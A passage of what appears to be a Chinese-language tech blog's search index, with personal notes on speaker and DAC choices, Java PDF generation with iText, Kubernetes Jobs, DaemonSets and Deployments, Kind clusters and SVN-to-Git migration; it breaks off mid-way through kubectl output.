可能要懂得喇叭知識\n\n### 被動式喇叭和主動式喇叭\n\n> 喇叭分為主動與被動  其最大差異為\n> 是否內置擴大電路～\n> \n> 主動式喇叭內建擴大機（電路）  因此只要有\n> 音源(類比聲音) 或是訊源( 數位 例如光纖 同軸 USB介面....注意不是所有主動式都內建dac) 即可發聲.....\n> \n> 被動式喇叭 代表必須額外接擴大機  DAC  線材...等等 （前端器材得以外接） 因此用料與價格等級規格可以依據自己口袋深度大幅度提高.....所以音質可提升空間主動式喇叭\n\n參考: [【心得】0~10萬 個人偏愛喇叭推薦 購買 基礎概念分享~ @電腦應用綜合討論 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/C.php?page=1&bsn=60030&snA=546968)\n\n### RCA\n\n簡單來說就是1(3.5mm) 轉 2同軸\nGoogle 一下應該就知道\n\n### DAC,DDC,音效卡,SPDIF\n\n專業文[【心得】迷思破解 音效卡? DAC?耳擴(擴大機)? 電源?聲音好壞?數位化聲音? @電腦應用綜合討論 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/C.php?bsn=60030&snA=469798)\n我其實看不是很懂...(冒汗)\n\n#### DAC,DDC,音效卡\n\n之前看影片，我覺得 DAC 和音效卡就是一樣的東西\n網路上還是有找到差異\n\n> 問:USB DAC是否可以取代音效卡?\n> 答:不能完全取代!因為一般USB DAC無如MIC/LINE IN等功能\n>          如果不使用麥克風或類比輸入的情況下\n>          你只是要單純接NB或PC聽2聲道音樂就可以算取代音效卡\n> \n> 問:DAC是否可以取代音效卡?\n> 答:DAC無法取代音效卡~因為DAC不是要取代音效卡\n>          DAC需要接音效卡的數位訊號輸出轉出類比2聲道\n>          提升原本聲音的品質~彼此是搭配互補的關係!\n\n參考: [音樂達人專業賣場](http://cckckimo.topshop.com.tw/News_Detail.aspx?ID=dd55d8dc-a7fc-480f-8267-81889e7906a3)\n\nDDC 目前看好像沒有解音效卡功能\n在USB DAC 沒普及之前\n中間需要用這個樣子\n如我下面想找 USB DDC 但沒找到\n有些音效卡上面有 SPDIF 輸出\n代表有 DDC 功能(我看到有偏有人這樣講)\n\n#### SPDIF 光纖\n\n{% asset_img https://i.imgur.com/GGW2g2m.png title %}\n\n光華找不到\n露天也只剩一家在賣...\n\n我當初看 SPDIF 一直以為音效卡上面有 SPDIF 就以為音效卡會處理\n但其實裝置輸入再SPDIF 輸出，音效卡不會做額外加工\n可能送到喇叭 SPDIF 裡面會是最好的方案\n\n光纖要注意線的頻率，對應喇叭和 DAC 是否有支援\n如: 24bit/192歐\n\n### 正常喇叭轉換過程\n\n{% asset_img img1.png title %}\n\n圖示參考: [亞當開箱｜音效卡分享 SoundBlaster G6、X3，聆聽模式&均衡響度，吃雞神器！ - YouTube](https://www.youtube.com/watch?v=Utcf7X0pJAA)\n推薦可以看一下上面影片\n\n### 喇叭需要關機嗎?\n\n之前我使用 vs4621 我就沒有關機\n因為他做那邊不好關機\n網路上也有正反兩派\n\n這次我問店家老闆，老闆說正常不到 100wa 的喇叭可以不用\ne235 重低音就需要關，老闆說他的 wa 數比較高，關掉才比較不會發熱\n\n## S360DB 整理\n\n### 該不該買 DAC\n\n先講結論，不推薦\n\n當初買 S360DB 很怕喇叭推不動\n所以有再看是否要買音效卡\n後來查了一推資料 \n原本想購買如下順續\nSPDIF(1) => ASUS 音效卡(2) => G6(3)=> 放棄購買 DAC (4)  --> DDC(5)\n\n(1) 當初想買這個，想說主機板有支援\n想說直接數位輸出，但這個要拆主機板\n這點我就很懶...\n因為我家插座沒接地線\n所以怕會引響喇叭有雜音...\n之前 3.5mm 喇叭現有特別換大通線\n減少雜音\n\n(2) 聽說買這個，通常音效卡有做電力保護\n所以比較不會聽到雜音\n但網路上找不到 ASUS 配 S360DB\n\n(3)->(4)\n看這篇有推薦[亞當開箱｜音效卡分享 SoundBlaster G6、X3，聆聽模式&均衡響度，吃雞神器！ - YouTube](https://www.youtube.com/watch?v=Utcf7X0pJAA)\n這個 G6 和 S360DB 在巴哈就有人討論是否要搭著用\n\n- [【問題】請問一下外接G6音效卡的問題… @電腦應用綜合討論 哈啦板 - 巴哈姆特](https://m.gamer.com.tw/forum/C.php?bsn=60030&snA=515456)\n這篇還滿值的參考\n有兩個大神在激辯，不過當時看這篇還看不是很懂\n反正最後不推薦使用 DAC\n\n- [RE:音效卡 資訊整合 分享 @電腦應用綜合討論 哈啦板 - 巴哈姆特](https://m.gamer.com.tw/forum/C.php?bsn=60030&snA=512689&bpage=0&ltype=&page=2)\n第 18 樓可以參考\n\n- [Re: [問題] 光纖和3.5真的有差嗎？ - 看板 Audiophile - 批踢踢實業坊](https://www.ptt.cc/bbs/Audiophile/M.1563109677.A.00B.html)\n- [【閒聊】關於漫步者喇叭的一些雜談與音效卡/DAC購置與否~ @電腦應用綜合討論 哈啦板 - 巴哈姆特](https://m.gamer.com.tw/forum/C.php?bsn=60030&snA=536463)\n\n(5)\n後來，我還是很想知道光纖音質\n想說有沒有 USB 兔出光纖\n後來有找到 1000 塊這種，但規格只有到 16/48歐\n買不對頻率會降頻(參考:[[討論] DDC跟DAC解析不同 以哪個為主？ - 看板 Headphone - 批踢踢實業坊](https://www.ptt.cc/bbs/Headphone/M.1531998629.A.401.html))\n\n喇叭有支援到 24/192歐\n後來疑似有找到有支援的\n\n- [CYP西柏 - 專業級 192KHz 高音質USB轉光纖 (Optical) 轉換盒 CDB-6 - PChome 24h購物](https://24h.m.pchome.com.tw/prod/DMAA5E-A900AL0AW)\n- [第二代 XMOS XU208異步 USB轉同軸光纖數字界面 1000MIPS DSD256 | 露天拍賣](https://www.ruten.com.tw/item/show?22052417475694#info)\n\n但文獻太少...又不便宜，所以我放棄\n**最後還是乖乖用 RCA **\n\n`最後有爬到有一個 DDC 比較有文獻`\n谷津 DA&T C14\n[谷津 U1 & c-11(usb轉同軸) & 電源濾波器 - Mobile01](https://m.mobile01.com/topicdetail.php?f=180&t=3178631)\n\n\n\n題外話，我朋友是站在買 DAC 這一塊\n聲音多多少少傳到 S360DB 轉換一次還是不一樣(但網路上說CP質不高)\n我朋友之前有買 SONY PHA-1A \n他覺得音樂有變比較好(以上存個人感受)\n但我覺得大多文獻都是不推薦的，因為變化不大\n假如你覺得不好可以買買看\n\n看著看著 SONY PHA-1A 停產啦，好像CP直比較高的DAC 是 Q5S(能USB接電腦，開藍芽走LDAC...) \n國外有USB type c 版本，台灣沒有賣的樣子\n這又是另一個坑，目前還沒打算買\n\n\n最近花了很多心力在研究\n把一些重點都記錄出來\n怕我下次買喇叭又要重新找資料\n希望能順便幫到有要買的人\n\n","tags":["spdif"],"categories":["Windows"]},{"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","url":"%2Fblog%2F2021%2F02%2F23%2FJava-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF%2F","content":"\nTODO: 整理\n\n<!--more-->\n* [haopenge/freemark-html-xhtml-pdf: freemark-html-xhtml-pdf ，从名称可以看出此项目是三者之间的转换，用于生成pdf 文件的](https://github.com/haopenge/freemark-html-xhtml-pdf)\n* [freemarker生成html、html轉pdf、pdf根據關鍵字定位、pdf簽名 - IT閱讀](https://www.itread01.com/content/1544193481.html)\n* [java通过html生成pdf,支持css和图片以及横向打印 - 林宇风 - 博客园](https://www.cnblogs.com/linyufeng/p/13402901.html)\n* [java通过html生成pdf,支持css和图片以及横向打印 - 林宇风 - 博客园](https://www.cnblogs.com/linyufeng/p/13402901.html)\n* [xhtmlrenderer + iText-HTML转PDF_hunan961的博客-CSDN博客_xhtmlrenderer](https://blog.csdn.net/hunan961/article/details/104901519)\n* [itext将html转为pdf,图片标签为base64的处理 - 小翔的个人空间 - OSCHINA - 中文开源技术交流社区](https://my.oschina.net/yifanxiang/blog/680936)\n* [itext将html转为pdf,图片标签为base64的处理 - 小翔的个人空间 - OSCHINA - 中文开源技术交流社区](https://my.oschina.net/yifanxiang/blog/680936)\n\n\n## 中文看不見問題(字型)\n\n* [解决PDF添加水印报错iText： Font 'STSong-Light' with 'UniGB-UCS2-H' is not recognized_HaHa_Sir的博客-CSDN博客](https://blog.csdn.net/HaHa_Sir/article/details/84350671)\n* [JWorld@TW Java論壇 - iText RtfShape 內文為中文會出現亂碼](https://www.javaworld.com.tw/jute/post/view?bid=11&id=266144&tpg=1&ppg=1&sty=1&age=0#266144)\n* [iText - PsMonkey 隨手筆記](http://wiki.psmonkey.org/java-3rd-lib/itext)\n* [Java iText+FreeMarker生成PDF(HTML转PDF) - 云飞扬-88 - 博客园](https://www.cnblogs.com/yunfeiyang-88/p/10984740.html)\n* [iText 解決中文問字型問題 顯示中文 | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/547725/)\n\n簡單說明一下，我這邊使用方法不是載入程式內部字型\n是使用 jar 裡面自型解決[解决PDF添加水印报错iText： Font 'STSong-Light' with 'UniGB-UCS2-H' is not recognized_HaHa_Sir的博客-CSDN博客](https://blog.csdn.net/HaHa_Sir/article/details/84350671)\n\n> 1、itext 經歷了從： itext.itext ---> com.lowagie ---> com.itextpdf 的三次升級，若使用了舊版本的jar，就會出現錯誤，還不好發現。\n> 2、多從maven repository 搜索下相關jar包，關注組件的歷史變化情況。\n> 3、會debeug，會追蹤源碼，找到拋出異常的根本原因所在！\n這邊找相對應java 版本，所以把itext-asian升到 5.2 就可以跑了\n後來對應網路上字型都不能跑(會亂碼)，\n猜測是簡體字型關係，看到[JWorld@TW Java論壇 - iText RtfShape 內文為中文會出現亂碼](https://www.javaworld.com.tw/jute/post/view?bid=11&id=266144&tpg=1&ppg=1&sty=1&age=0#266144)\n\n```java\n bfChinese = BaseFont.createFont(\"MHei-Medium\", \"UniCNS-UCS2-H\", BaseFont.NOT_EMBEDDED);\n``` \n\n就可以跑出中文字，感動QQ\n\n後來發現用 Android 中文會看不到\n可能用標楷體會能解決\n\n\n\n## 圖片(base64)\n\n## 轉 xhtml\n\n\n\n## 別人範例\n\n[一次java导出pdf的经历 - mickey007 - 博客园](https://www.cnblogs.com/blueskyli/p/9921832.html)\n[Java生成pdf文件或jpg图片 - 简书](https://www.jianshu.com/p/36517afe0c36)\n\n## 別的方法\n\n[jhonnymertz/java-wkhtmltopdf-wrapper: A Java wrapper for wkhtmltopdf](https://github.com/jhonnymertz/java-wkhtmltopdf-wrapper)\n\n\n","tags":["ftl"],"categories":["Java"]},{"title":"Kubernetes 的 Job","url":"%2Fblog%2F2021%2F02%2F22%2FKuberenetes-%E7%9A%84-Job%2F","content":"\n直接進入重點\n\n<!--more-->\n\n## 官方實例\n\n```yml job.yaml\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: pi\nspec:\n  template:\n    spec:\n      containers:\n      - name: pi\n        image: perl\n        command: [\"perl\",  \"-Mbignum=bpi\", \"-wle\", \"print bpi(2000)\"]\n      restartPolicy: Never\n  backoffLimit: 4\n```\n\n\n```bash\nkubectl apply -f https://kubernetes.io/examples/controllers/job.yaml\n```\n\n\n## 自動清理\n\n完成 100 秒就會清除，我在 kind 沒有效果...\n\n> FEATURE STATE: Kubernetes v1.12 [alpha]\n\n可能我的環境還不支援??\n\n```bash\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: pi-with-ttl\nspec:\n  ttlSecondsAfterFinished: 100\n  template:\n    spec:\n      containers:\n      - name: pi\n        image: perl\n        command: [\"perl\",  \"-Mbignum=bpi\", \"-wle\", \"print bpi(2000)\"]\n      restartPolicy: Never\n```\n\n## Crontab \n\n```yml\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  schedule: \"*/1 * * * *\"\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: hello\n            image: busybox\n            imagePullPolicy: IfNotPresent\n            args:\n            - /bin/sh\n            - -c\n            - date; echo Hello from the Kubernetes cluster\n          restartPolicy: OnFailure\n\n```\n\n\n## Queue Work\n\n- [使用工作队列进行粗粒度并行处理 | Kubernetes](https://kubernetes.io/zh/docs/tasks/job/coarse-parallel-processing-work-queue/)\n- [详解 Kubernetes Job 和 CronJob 的实现原理 - 面向信仰编程](https://draveness.me/kubernetes-job-cronjob/)","tags":["job"],"categories":["Kubernetes"]},{"title":"SVN 移轉 GIT 小記","url":"%2Fblog%2F2021%2F02%2F21%2FSVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98%2F","content":"\n最近公司 SVN Repository 要備廢除\n由於先前案子是使用 SVN，此專案也是交接下來的\n不希望把 SVN 修改記錄刪除\n很多專案都是把檔案從丟新的到 GIT\n但我不是這樣做\n花了一點時間找工具轉\n趕緊紀錄，因為沒有在家實作\n所以大概季錄一下\n\n<!--more-->\n\n## 能使用工具\n\n- subgit\n- svn2git\n- git svn\n\n```bash\nsubgit import --non-interactive --default-domain xxxx.com.tw --svn-url https://IP/svn/project  project.git\n```\n\n\n原本要用 subgit ，但下載發現好像有期限\n但執行照一般指令，沒有成功(但好像是SVN帳號或 我忘了連VPN)\nsub2git 也跳出底程指令不能跑\n我看他使用 git svn 就研究了一下\n好像跳出帳號密碼驗證失敗\n\n## SVN 輸入帳號轉 GIT\n\n```bash\nsudo apt-get install git-svn \n```\n\n```bash\ngit svn clone  svn://server/repo  --username user\n# svn: 可以改 https://\ngit svn clone https://IP/svn/xxx/oooo --username=xxx\n```\n輸入完跳出密碼就可以轉了\n`-r1450:HEAD`\n可以限制版本從哪邊開始\n\n\n\n參考找的資料\n[將 SVN Local Repository 轉換為 Git Local Repository (Windows) | 格物致知](https://amobiz.github.io/2014/09/07/convert-svn-local-repository-to-git-local-repository-windows/)\n\n[[git]開始使用git - 用git操作svn repo @ Alan Tsai 的學習筆記｜A Microsoft MVP, MCT, Blogger, Youtuber and ASP .NET Developer Blog](https://blog.alantsai.net/posts/2017/06/git-svn-usage)\n\n[使用 svn2git 從 SVN 遷移到 Git | 他山教程，只選擇最優質的自學材料](http://www.tastones.com/zh-tw/stackoverflow/git/migrating-to-git/migrate_from_svn_to_git_using_svn2git/)\n\n[git svn clone --password pass gives “Unknown option: password” - Stack Overflow](https://stackoverflow.com/questions/21040553/git-svn-clone-password-pass-gives-unknown-option-password)\n\n[git svn migration failing with svn 1.8 - Stack Overflow](https://stackoverflow.com/questions/27240428/git-svn-migration-failing-with-svn-1-8)\n\n[How to git-svn clone the last n revisions from a Subversion repository? - Stack Overflow](https://stackoverflow.com/questions/747075/how-to-git-svn-clone-the-last-n-revisions-from-a-subversion-repository)","tags":["git"],"categories":["Git"]},{"title":"Kubernetes 的 DaemonSet","url":"%2Fblog%2F2021%2F02%2F18%2FKuberentes-%E7%9A%84-DaemonSet%2F","content":"\nDeployment 和 ReplicaSet 通常使用多個 replica 時候，都是建在各 nodes 隨機安裝。\nDaemonSet 可以讓每一台 node 運行 Pod。\n感覺這個跟 docker swarm 的 agent mode :global  一樣 [docker swarm 一些指令相關整理 | 程式狂想筆記](https://malagege.github.io/blog/2019/12/07/docker-swarm-%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4%E7%9B%B8%E9%97%9C%E6%95%B4%E7%90%86/)\n立馬實作看看\n\n<!--more-->\n\n## DaemonSet\n\n使用 DaemonSet 會在所有 node 建立 Pod。如先前所講，跟 Docker Swarm 很像的 agent mode :global 很像\n也可以針對 nodename 來建立 Pod。\n\n## 建立 DaemonSet \n\n[examples/9-1-fluentd.yaml at master · kubernetes-up-and-running/examples](https://github.com/kubernetes-up-and-running/examples/blob/master/9-1-fluentd.yaml)\n\n這邊版本太舊\nno matches for kind \"DaemonSet\" in version \"extensions/v1beta1\n[no matches for kind \"DaemonSet\" in version \"extensions/v1beta1\" · Issue #627 · gluster/gluster-kubernetes](https://github.com/gluster/gluster-kubernetes/issues/627)\n\n\n> notes:\n> \n>     changed apiVersion to \"apps/v1\"\n>     added selector\n\n\n最後還是套用官方文件[DaemonSet | Kubernetes](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/)\n\n```yml\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fluentd-elasticsearch\n  namespace: kube-system\n  labels:\n    k8s-app: fluentd-logging\nspec:\n  selector:\n    matchLabels:\n      name: fluentd-elasticsearch\n  template:\n    metadata:\n      labels:\n        name: fluentd-elasticsearch\n    spec:\n      tolerations:\n      # this toleration is to have the daemonset runnable on master nodes\n      # remove it if your masters can't run pods\n      - key: node-role.kubernetes.io/master\n        effect: NoSchedule\n      containers:\n      - name: fluentd-elasticsearch\n        image: quay.io/fluentd_elasticsearch/fluentd:v2.5.2\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlibdockercontainers\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n      terminationGracePeriodSeconds: 30\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlibdockercontainers\n        hostPath:\n          path: /var/lib/docker/containers\n```\n\n\n```bash\nkubectl apply -f https://k8s.io/examples/controllers/daemonset.yaml\n```\n\n查看狀況，這邊namespace 要調整\n\n```bash\nkubectl describe daemonsets fluentd-elasticsearch --namespace kube-system\n# Name:           fluentd-elasticsearch\n# Selector:       name=fluentd-elasticsearch\n# Node-Selector:  <none>\n# Labels:         k8s-app=fluentd-logging\n# Annotations:    deprecated.daemonset.template.generation: 1\n# Desired Number of Nodes Scheduled: 6\n# Current Number of Nodes Scheduled: 6\n# Number of Nodes Scheduled with Up-to-date Pods: 6\n# Number of Nodes Scheduled with Available Pods: 6\n# Number of Nodes Misscheduled: 0\n# Pods Status:  6 Running / 0 Waiting / 0 Succeeded / 0 Failed\n# Pod Template:\n#   Labels:  name=fluentd-elasticsearch\n#   Containers:\n#    fluentd-elasticsearch:\n#     Image:      quay.io/fluentd_elasticsearch/fluentd:v2.5.2\n#     Port:       <none>\n#     Host Port:  <none>\n#     Limits:\n#       memory:  200Mi\n#     Requests:\n#       cpu:        100m\n#       memory:     200Mi\n#     Environment:  <none>\n#     Mounts:\n#       /var/lib/docker/containers from varlibdockercontainers (ro)\n#       /var/log from varlog (rw)\n#   Volumes:\n#    varlog:\n#     Type:          HostPath (bare host directory volume)\n#     Path:          /var/log\n#     HostPathType:  \n#    varlibdockercontainers:\n#     Type:          HostPath (bare host directory volume)\n#     Path:          /var/lib/docker/containers\n#     HostPathType:  \n# Events:\n#   Type    Reason            Age    From                  Message\n#   ----    ------            ----   ----                  -------\n#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-rqpth\n#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-g5r57\n#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-bzv6c\n#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-sjt9l\n#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-vfs9w\n#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-wxf6v\n```\n\n\n```bash\nkubectl get pods -o wide --namespace kube-system   \n# NAME                                          READY   STATUS    RESTARTS   AGE     IP           NODE                  NOMINATED NODE   READINESS GATES\n# fluentd-elasticsearch-bzv6c                   1/1     Running   0          6m38s   10.244.2.2   kind-control-plane3   <none>           <none>\n# fluentd-elasticsearch-g5r57                   1/1     Running   0          6m38s   10.244.0.2   kind-control-plane    <none>           <none>\n# fluentd-elasticsearch-rqpth                   1/1     Running   0          6m38s   10.244.1.5   kind-control-plane2   <none>           <none>\n# fluentd-elasticsearch-sjt9l                   1/1     Running   0          6m38s   10.244.5.2   kind-worker3          <none>           <none>\n# fluentd-elasticsearch-vfs9w                   1/1     Running   0          6m38s   10.244.3.2   kind-worker           <none>           <none>\n# fluentd-elasticsearch-wxf6v                   1/1     Running   0          6m38s   10.244.4.2   kind-worker2          <none>           <none>\n```\n\n## node 新增一個 Label\n\n```bash\n# 查看 nodes 名稱有哪些\nkubectl get nodes\n# NAME                  STATUS   ROLES    AGE   VERSION\n# kind-control-plane    Ready    master   34m   v1.19.1\n# kind-control-plane2   Ready    master   33m   v1.19.1\n# kind-control-plane3   Ready    master   32m   v1.19.1\n# kind-worker           Ready    <none>   32m   v1.19.1\n# kind-worker2          Ready    <none>   32m   v1.19.1\n# kind-worker3          Ready    <none>   32m   v1.19.1\n\n# 新增一個 label\nkubectl label nodes kind-control-plane ssd=true\n\n# 查看 selector ssd=true nodes\nkubectl get nodes --selector ssd=true\n```\n\n```yml\napiVersion: apps/v1\nkind: \"DaemonSet\"\nmetadata:\n  labels:\n    app: nginx\n    ssd: \"true\"\n  name: nginx-fast-storage\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n        ssd: \"true\"\n    spec:\n      tolerations:\n      # this toleration is to have the daemonset runnable on master nodes\n      # remove it if your masters can't run pods\n      - key: node-role.kubernetes.io/master\n        effect: NoSchedule\n      nodeSelector:\n        ssd: \"true\"\n      containers:\n        - name: nginx\n          image: nginx:1.10.0\n```\n\n\n這邊有實作[Day-25 認識DaemonSet - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10251596)\nPod 都沒有出來\n\n不知道是不是 Kind 出問題??\n\n```yml\n      tolerations:\n      # this toleration is to have the daemonset runnable on master nodes\n      # remove it if your masters can't run pods\n      - key: node-role.kubernetes.io/master\n        effect: NoSchedule\n```\n\n這行家這個就能跑了...\n在研究什麼原因\n\n\n\n## 刪除 DaemonSet \n\n```bash\nkubectl delete daemonset nginx-fast-storage\n```","tags":["daemonset"],"categories":["Kuberenetes"]},{"title":"Kind 建置 Cluster","url":"%2Fblog%2F2021%2F02%2F18%2FKind-%E5%BB%BA%E7%BD%AE-Cluster%2F","content":"\n最近看 Kuberenets 看到 DaemonSet\n由於目前 Kind 跟 MiniKube 都是使用單結點\n沒有用 Cluster\n今天照 Kind 實作看看\n\n<!--more-->\n\n\n## 建置 Cluster\n\n\n```bash\n# 預設 cluster context 名稱為 `kind`.\nkind create cluster \n\n# 名稱為 kind-2\nkind create cluster --name kind-2\n```\n\n這邊建立出來會有兩個 Cluster\n但這兩個 Cluster 是分開的\n\n等等，我不是要分開的\n\n## 查看哪些 Cluster\n\n```bash\nkind get clusters\n# kind\n# kind-2\nkubectl cluster-info --context kind-kind\nkubectl cluster-info --context kind-kind-2\n```\n\n等等，我不是要分開的\n\n## 刪除 Cluster\n\n```bash\nkind delete cluster --name kind-2\n```\n\n## Multi-node clusters\n\n```yml\n# three node (two workers) cluster config\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n- role: worker\n- role: worker\n```\n\n```yml\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n- role: control-plane\n- role: control-plane\n- role: worker\n- role: worker\n- role: worker\n```\n\n上面 yml 選一個跑\n\n```bash\nkind create cluster --config kind-example-config.yaml\n```\n\n\n建立這麼簡單\n感覺跟 Docker Swarm 一樣\n\n我以為要注意在連 Cluster 看當下 node 有哪些 container\n看來全部都合起來了\n\n\n\n看完，真的是白擔心了\n真的可以單結點來測試\n\n不過，DaemonSet 好像能控制在哪個 nodes 執行\n建立 Cluster 多 node 也不錯\n\n\n**發現重開機，kubectl 就會連不到**\n所以，應該只能重建","tags":["Kubernetes"],"categories":["Kuberenetes"]},{"title":"Kubernetes 的 Deployment","url":"%2Fblog%2F2021%2F02%2F14%2FKubernetes-%E7%9A%84-Deployment%2F","content":"\n感覺是滿多的功能\n但頁數比較想像中的少\n趕緊消化\n\n<!--more-->\n\n## 前言\n\nReplicaSet 單元最後看到使用 Deployment\n想說怎麼不直接教 Deployment\n實作簡單功能，發現原來 Deployment 會建立 ReplicaSet \n所以還是要會 ReplicaSet 怎麼用比較好\n\n\n## 建立一個 Deployment\n\n遇到apiVersion\nerror: unable to recognize \"kuard-deployment.yml\": no matches for kind \"Deployment\" in version \"extensions/v1beta1\"\nerror: unable to recognize \"kuard-deployment.yml\": no matches for kind \"Deployment\" in version \"apps/v1beta1\"\n參考:[kubernetes - no matches for kind \"Deployment\" in version \"extensions/v1beta1\" - Stack Overflow](https://stackoverflow.com/questions/58481850/no-matches-for-kind-deployment-in-version-extensions-v1beta1)\n\n```yml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kuard-deployment\n#   labels:\n#     app: kuard\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kuard\n  template:\n    metadata:\n      labels:\n        app: kuard\n    spec:\n      containers:\n        - image: gcr.io/kuar-demo/kuard-amd64:blue\n          name: kuard\n```\n\n[Kubernetes kuard deployment](https://gist.github.com/erikaulin/d4de231655a1a5011dae5ecc39a49956)\n\n\n```bash\n# 查看所有 Object List\nkubectl get all \n# NAME                                    READY   STATUS    RESTARTS   AGE\n# pod/kuard-deployment-6cd695495f-kt88w   1/1     Running   0          105s\n\n# NAME                  TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE\n# service/bar-service   ClusterIP   10.96.108.167   <none>        5678/TCP   2d16h\n# service/foo-service   ClusterIP   10.96.109.30    <none>        5678/TCP   2d16h\n# service/kubernetes    ClusterIP   10.96.0.1       <none>        443/TCP    2d17h\n\n# NAME                               READY   UP-TO-DATE   AVAILABLE   AGE\n# deployment.apps/kuard-deployment   1/1     1            1           106s\n\n# NAME                                          DESIRED   CURRENT   READY   AGE\n# replicaset.apps/kuard-deployment-6cd695495f   1         1         1       106s\n\nkubectl get deployments kuard-deployment -o jsonpath --template {.spc.selector.matchLabels}\n# {\"app\":\"kuard\"}\n\nkubectl get all --selector=\"app=kuard\"\n# NAME                                    READY   STATUS    RESTARTS   AGE\n# pod/kuard-deployment-6cd695495f-kt88w   1/1     Running   0          9m34s\n\n# NAME                                          DESIRED   CURRENT   READY   AGE\n# replicaset.apps/kuard-deployment-6cd695495f   1         1         1       9m34s\nkubectl get replicasets --selector=app=kuard\n# NAME                          DESIRED   CURRENT   READY   AGE\n# kuard-deployment-6cd695495f   1         1         1       79m\n\n# 修改 deployment 的 replicas\nkubectl scale deployments kuard-deployment --replicas=3\n\nkubectl get replicasets --selector=app=kuard\n# NAME                          DESIRED   CURRENT   READY   AGE\n# kuard-deployment-6cd695495f   3         3         3       82m\n\n# 修改 replicaset = 1(這邊不是用 deployment)\nkubectl scale replicaset kuard-deployment-6cd695495f --replicas=1 \n\nkubectl get replicasets --selector=app=kuard\n# NAME                          DESIRED   CURRENT   READY   AGE\n# kuard-deployment-6cd695495f   3         3         3       82m\n\n# 不會發生任何改變，下面等等會說\n```\n\n這邊說一下運作方式\nDeployment 會管理 ReplicaSet，ReplicaSet 用來管理Pod。\n所以要懂 ReplicaSet 是做什麼用的。\n\n上面對 ReplicasSet 做 scale 調整\n為什麼不會改變，是因為`Deployment` 上層設定不一樣的值\nDeployment 控制器會重新調整 replica 數量\n\n這種情況下，有一個方法改 ReplicaSet \n對 Deployment 刪除(`--cascade=orphan`) <-- 舊版是 `--cascade=false`\n\n\n```bash\n# 匯出設定檔出來\nkubectl get deployments kuard-deployment -o yaml > kuard-deployment.yaml\n# 暫時不研究，但應該可以不用做\n#kubectl replace -f kuard-deployment.yaml --save-config\n```\n\n可以看到 裡面有很多預設值\n\n```yaml\n  strategy:\n    rollingUpdate:\n      maxSurge: 25%\n      maxUnavailable: 25%\n    type: RollingUpdate\n```\n\n這邊跟書裡面提到不一樣\n看來新版`maxSurge`和`maxUnavailable`都變成百分比\n\n## 管理 Deployment\n\n```bash\nkubectl describe deployments kuard-deployment\n```\n\n```\nName:                   kuard-deployment\nNamespace:              default\nCreationTimestamp:      Sun, 14 Feb 2021 20:55:44 +0800\nLabels:                 <none>\nAnnotations:            deployment.kubernetes.io/revision: 1\nSelector:               app=kuard\nReplicas:               1 desired | 1 updated | 1 total | 1 available | 0 unavailable\nStrategyType:           RollingUpdate\nMinReadySeconds:        0\nRollingUpdateStrategy:  25% max unavailable, 25% max surge\nPod Template:\n  Labels:  app=kuard\n  Containers:\n   kuard:\n    Image:        gcr.io/kuar-demo/kuard-amd64:blue\n    Port:         <none>\n    Host Port:    <none>\n    Environment:  <none>\n    Mounts:       <none>\n  Volumes:        <none>\nConditions:\n  Type           Status  Reason\n  ----           ------  ------\n  Available      True    MinimumReplicasAvailable\n  Progressing    True    NewReplicaSetAvailable\nOldReplicaSets:  <none>\nNewReplicaSet:   kuard-deployment-6cd695495f (1/1 replicas created)\nEvents:\n  Type    Reason             Age   From                   Message\n  ----    ------             ----  ----                   -------\n  Normal  ScalingReplicaSet  16m   deployment-controller  Scaled down replica set kuard-deployment-6cd695495f to 1\n```\n\n```\nOldReplicaSets:  <none>\nNewReplicaSet:   kuard-deployment-6cd695495f (1/1 replicas created)\n```\n\n其中 `OldReplicaSets` 和 `NewReplicaSet` 是由 Deployment 管理狀態。rollout 中兩邊欄位值會有資料，rollout 完成後 OldReplicaSets 就會 none。\n\n## 更改容器的映像檔\n\n修改 deployment 設定裡面的 image tag 改成 green\n\n```yml\n    spec:\n      containers:\n        - image: gcr.io/kuar-demo/kuard-amd64:blue\n```\n\n`kubectl apply -f kuard-deployment.yml`\n建議 replicaset 可以設定大一點\n可以看到 OldReplicaSets ,NewReplicaSet 這兩個變化\n\n```bash\n# 查看更新狀態\nkubectl rollout status deployments kuard-deployment\n\n# 可以看到新舊 ReplicaSets 都存在，之後退版可能會用到\nkubectl get replicasets -o wide \n# NAME                          DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES                               SELECTOR\n# kuard-deployment-5984cbd7dd   0         0         0       